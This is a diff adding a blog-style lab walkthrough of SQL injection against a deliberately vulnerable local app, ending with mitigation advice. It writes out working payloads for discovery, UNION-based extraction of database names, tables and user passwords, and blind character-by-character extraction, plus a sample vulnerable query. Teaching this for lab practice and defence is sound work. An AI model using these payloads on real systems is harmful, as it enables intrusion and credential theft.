@@ -1,0 +1,117 @@
+---
+title: "SQL Injection Lab: From Discovery to Exploitation"
+description: "A hands-on walkthrough of SQL injection techniques — from basic error-based injection to blind boolean extraction."
+date: "2024-10-03"
+tags: ["cybersecurity", "web-security", "penetration-testing", "sql-injection"]
+---
+
+# SQL Injection Lab: From Discovery to Exploitation
+
+SQL injection remains one of the most prevalent web vulnerabilities. In this lab walkthrough, we go from identifying an injectable parameter to extracting sensitive data.
+
+> ⚠️ **Disclaimer:** Only perform these techniques on systems you own or have explicit written permission to test.
+
+## Lab Setup
+
+We'll use a deliberately vulnerable application (DVWA or similar):
+
+```
+Target: http://localhost:8080/vulnerabilities/sqli/
+Parameter: id (GET)
+```
+
+## Phase 1: Discovery
+
+Start with the classic apostrophe test:
+
+```
+http://localhost:8080/vulnerabilities/sqli/?id=1'
+```
+
+If the page errors out with a SQL syntax error — you've found injection.
+
+### Confirming with Boolean Logic
+
+```sql
+-- True condition (normal page)
+1' AND 1=1 --
+
+-- False condition (different/empty response)
+1' AND 1=2 --
+```
+
+Different responses confirm Boolean-based SQLi.
+
+## Phase 2: Enumeration
+
+### Find Column Count
+
+```sql
+1' ORDER BY 1 --   -- works
+1' ORDER BY 2 --   -- works
+1' ORDER BY 3 --   -- error → 2 columns
+```
+
+### Identify Injectable Columns
+
+```sql
+1' UNION SELECT NULL, NULL --
+1' UNION SELECT 'a', 'b' --
+```
+
+## Phase 3: Extraction
+
+### Database Info
+
+```sql
+1' UNION SELECT database(), user() --
+```
+
+### List Tables
+
+```sql
+1' UNION SELECT table_name, NULL 
+   FROM information_schema.tables 
+   WHERE table_schema=database() --
+```
+
+### Extract Credentials
+
+```sql
+1' UNION SELECT user, password 
+   FROM users --
+```
+
+## Blind SQLi: When There's No Output
+
+When the page doesn't display data directly:
+
+```sql
+-- If admin user exists, page loads normally
+1' AND (SELECT COUNT(*) FROM users WHERE username='admin')>0 --
+
+-- Extract characters one by one
+1' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a' --
+```
+
+## Mitigation
+
+The fix is always parameterized queries:
+
+```python
+# Vulnerable
+cursor.execute(f"SELECT * FROM users WHERE id = {user_input}")
+
+# Safe
+cursor.execute("SELECT * FROM users WHERE id = %s", (user_input,))
+```
+
+Also implement:
+- Input validation (allowlist, not denylist)
+- WAF with SQLi signatures
+- Least-privilege DB accounts
+- Error messages that don't expose stack traces
+
+## Key Takeaways
+
+SQL injection is old but never gone. Every new developer is a potential reintroduction vector. Parameterize everything, test everything, and audit regularly.
